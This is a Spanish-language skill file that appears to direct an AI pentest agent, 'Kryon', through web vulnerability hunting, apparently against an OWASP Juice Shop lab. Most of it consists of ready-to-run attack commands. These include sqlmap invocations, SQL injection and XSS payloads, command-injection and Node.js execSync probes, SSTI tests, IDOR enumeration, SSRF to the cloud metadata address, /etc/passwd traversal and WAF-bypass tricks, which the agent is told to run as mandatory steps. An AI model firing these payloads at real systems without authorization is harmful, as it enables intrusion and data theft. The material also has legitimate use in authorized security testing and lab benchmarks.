---
name: vuln-hunter
description: "Búsqueda avanzada de vulnerabilidades, bug bounty, zero-day"
triggers:
  tech: []
  ports: []
  # F185 — broaden keyword triggers so the skill activates on web-vuln
  # objective phrases the operator actually uses (``find SQLi or XSS or
  # RCE``, ``buscar injection``, etc.). Without these keywords the skill
  # wasn't activating reliably, and its F185 pre_hooks (nuclei + nikto)
  # never fired — bench runs 2/3 saw 0 findings.
  keywords:
    - "vulnerability"
    - "vuln"
    - "bug bounty"
    - "cve"
    - "zero-day"
    - "exploit"
    - "sqli"
    - "sql injection"
    - "xss"
    - "cross-site scripting"
    - "rce"
    - "remote code execution"
    - "idor"
    - "ssrf"
    - "path traversal"
    - "injection"
    - "web vulnerability"
    - "web vuln"
    # ``find`` is the most common verb in pentest objectives
    # ("find SQLi", "find XSS or RCE", etc.) — broadens activation
    # but also matches generic phrasing, which is the point.
    - "find"
priority: 15
required_tools:
  - run_command
  - nuclei_scan
  - search_vulnerabilities
  - query_knowledge_base
  - duckduckgo_search
# F185 — Deterministic-first execution. Pre-hooks run BEFORE the LLM
# sees the engagement. The model used to bounce between "should I
# invoke nuclei? sqlmap? nikto?" while burning turns on CoT; with
# pre-hooks we always run the active detectors first and the LLM
# only narrates the evidence.
#
# All pre-hooks are ``required: false`` so a missing binary doesn't
# block the engagement — the LLM falls back to manual probes when a
# hook fails (the F164 cache failure-skip means the failure isn't
# poisoning the cache either).
pre_hooks:
  - tool: nuclei_scan
    args:
      target: "{ctx.target}"
      severity: "critical,high,medium"
    inject_as: nuclei_pre_scan
    required: false
    timeout_s: 240
  - tool: run_command
    args:
      command: "nikto -host {ctx.target} -nointeractive -Tuning x6 -maxtime 60"
    inject_as: nikto_pre_scan
    required: false
    timeout_s: 90
---

## Toolbox disponible (F182)

El container `kryon` tiene estos binarios listos para invocar via
`run_command` — **NO intentes instalarlos, ya están**:

| Binario | Path | Uso típico |
|---|---|---|
| `sqlmap` | `/usr/bin/sqlmap` | SQLi automation |
| `nikto` | `/usr/bin/nikto` | Web server misconfig |
| `nuclei` | `/usr/local/bin/nuclei` | Template-based vuln scan (~9000 templates) |
| `whatweb` | `/usr/bin/whatweb` | Tech fingerprint |
| `curl` | `/usr/bin/curl` | Manual HTTP probes |
| `ffuf` | `/usr/bin/ffuf` | Endpoint fuzzing |
| `gobuster` | `/usr/bin/gobuster` | Directory/DNS brute |
| `wget` | `/usr/bin/wget` | Alt HTTP fetch |

Tools Kryon-wrapped equivalentes (preferidas cuando aplique):
`whatweb_scan`, `nuclei_scan`, `search_vulnerabilities`,
`duckduckgo_search`, `query_knowledge_base`,
`recall_similar_experiences`.

## Metodología de Hunting

1. Fingerprint detallado del stack (versiones exactas)
2. `search_vulnerabilities(technology=TECH, version=VERSION)` para cada componente
3. `nuclei_scan(target=HOST, severity="critical,high")` — templates críticos
4. `duckduckgo_search(query="TECH VERSION exploit CVE site:exploit-db.com")` — exploits públicos

## DETECCIÓN ACTIVA OBLIGATORIA (F182)

**Si el objetivo declarado contiene `sqli`, `xss`, `rce`, `idor`,
`ssrf` o `path-traversal`, los siguientes probes son OBLIGATORIOS
antes de emitir el reporte final.** Pasar la fase sin haber ejecutado
estas tools = bench NOT_MET. No bastan los headers missing /
info-disclosure (CWE-200) para satisfacer goals de vuln activos.

### Orden imperativo

Antes de declarar findings, ejecutá EN ESTE ORDEN:

1. **Descubrir endpoints** con `run_command`:
   ```
   curl -s ${TARGET}/ | grep -oE 'href="[^"]+"' | head -20
   curl -s ${TARGET}/robots.txt
   curl -s ${TARGET}/sitemap.xml
   ```

2. **Listar APIs** comunes:
   ```
   for p in /api /api/v1 /api/users /api/products /api/login /api/search /rest /graphql; do
     curl -s -o /dev/null -w "%{http_code} $p\n" "${TARGET}${p}"
   done
   ```

3. **Probes por vuln-class** — usá los bloques abajo según el goal.

### SQLi probes (cuando goal incluye `sqli`)

**Tool primaria**: `sqlmap` ya está instalado en el container. Úsala antes que curl manual.

```
# Detectar param vulnerable en endpoint
run_command sqlmap -u "${TARGET}/api/products?q=test" --batch --level=3 --risk=2 --threads=5 --timeout=15

# Si conocés un parametro POST
run_command sqlmap -u "${TARGET}/rest/user/login" --data='{"email":"admin","password":"x"}' --batch --level=3 --headers="Content-Type: application/json"

# Fast manual probe (para validar antes de sqlmap)
run_command 'curl -s -w "\n%{http_code}\n" "${TARGET}/rest/products/search?q=test%27%20OR%201%3D1--"'
run_command 'curl -s -w "\n%{http_code}\n" -X POST "${TARGET}/rest/user/login" -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op%27%20OR%20%271%27%3D%271\",\"password\":\"x\"}"'
```

Si `sqlmap` reporta "is vulnerable" o respuesta refleja error SQL
(syntax error, ORA-, unclosed quotation), emití finding **CWE-89
HIGH** con evidencia exacta del output.

### XSS probes (cuando goal incluye `xss`)

```
# Reflected XSS en search parameters
for ep in "/search?q=" "/rest/products/search?q=" "/api/products?search=" "/?search="; do
  run_command 'curl -s "${TARGET}'${ep}'<script>alert(1)</script>" | grep -c "<script>alert(1)</script>"'
done

# Reflejos en headers
run_command 'curl -s "${TARGET}/" -H "User-Agent: <img src=x onerror=alert(1)>" | grep -c "onerror=alert"'

# DOM-based check (juice-shop search)
run_command 'curl -s "${TARGET}/#/search?q=<iframe>"'
```

Si el output contiene el payload literal (no escapado), emití
finding **CWE-79 HIGH** con la URL y respuesta como evidencia.

### RCE probes (cuando goal incluye `rce`)

```
# Command injection en parametros típicos
for ep in "/api/exec" "/run" "/exec" "/api/system" "/ping"; do
  run_command 'curl -s -w "\n%{http_code}\n" "${TARGET}'${ep}'?cmd=id;echo INJECTED"'
done

# SSTI (Server-Side Template Injection)
run_command 'curl -s -G --data-urlencode "name={{7*7}}" "${TARGET}/api/greet"'
# Si la respuesta contiene "49" → SSTI confirmada (Jinja/Nunjucks)

# Eval-based (Node.js)
run_command 'curl -s -G --data-urlencode "x=require(\"child_process\").execSync(\"id\")" "${TARGET}/api/calc"'
```

### IDOR probes (cuando goal incluye `idor`)

```
# Increment user IDs sin auth
for id in 1 2 3 4 5 10 100; do
  run_command 'curl -s -w " %{http_code}\n" "${TARGET}/api/users/'${id}'"'
done

# UUID guessing (Juice Shop usa numéricos)
run_command 'curl -s "${TARGET}/api/Users/1"'
run_command 'curl -s "${TARGET}/api/BasketItems/1"'
```

Si distintos IDs devuelven 200 con datos distintos sin auth header,
emití **CWE-639 HIGH** (Missing Authorization).

### Pruebas heredadas (referencias rápidas, NO substituto del orden imperativo arriba)

- SQLi: `' OR 1=1--` en parámetros GET/POST
- XSS: `<script>alert(1)</script>` en inputs
- SSRF: `http://169.254.169.254/latest/meta-data/` en URL params
- Path traversal: `../../../etc/passwd` en file params
- IDOR: incrementar IDs numéricos en API endpoints

## Reglas operativas (F168) — NO desperdicies turns

Cada fase del orchestrator tiene un budget de turns acotado. **Si una
herramienta falla, NO gastes turns reintentándola con variaciones;
pivotá a otra herramienta o a prueba manual.**

### Sobre `nuclei_scan`
- Llamalo sin `templates=` la primera vez. La auto-selección por
  defecto es lo correcto para recon exploratorio.
- Valores VÁLIDOS para `templates=` (si lo necesitás): `cves/`,
  `vulnerabilities/`, `default-logins/`, `exposures/`,
  `misconfiguration/`, `technologies/`. Cualquier otro string
  (especialmente `web`, `all`, `default`) es **inválido** — la
  herramienta lo va a stripear y caer al default.
- Si la primera invocación devuelve `[WRN] Loading 1 unsigned
  templates` y 0 hallazgos, **NO reintentes nuclei** — pivotá
  inmediatamente a `run_command` con curl + payloads manuales (SQLi,
  XSS, IDOR) sobre los endpoints que ya descubriste.

### Sobre `nikto`
- `nikto` se invoca via `run_command "nikto -host TARGET"`. En la
  mayoría de containers ya está instalado. Si `which nikto` retorna
  vacío, **NO intentes instalarlo** (apt requiere root y no lo tenés);
  pivotá a curl manual.

### Cuando llegás al límite
- En vez de quedarte buscando "una herramienta más", emití tus
  findings actuales con `add_finding` aunque sean parciales. Un finding
  P2 con evidencia es mejor que 0 findings tras 5 turns de loop.

## Bypass de WAF

Si detectás WAF (Cloudflare, ModSecurity):
- Encodear payloads: URL encoding doble, Unicode
- Alternar case: `SeLeCt`, `uNiOn`
- Usar comentarios inline: `/**/`
- Headers alternativos: `X-Forwarded-For`, `X-Original-URL`

## Priorización de findings

- **P1 (Crítico)**: RCE, SQLi, auth bypass, SSRF a metadata
- **P2 (Alto)**: XSS stored, IDOR con data leak, file upload
- **P3 (Medio)**: XSS reflected, info disclosure, CSRF
- **P4 (Bajo)**: headers faltantes, version disclosure
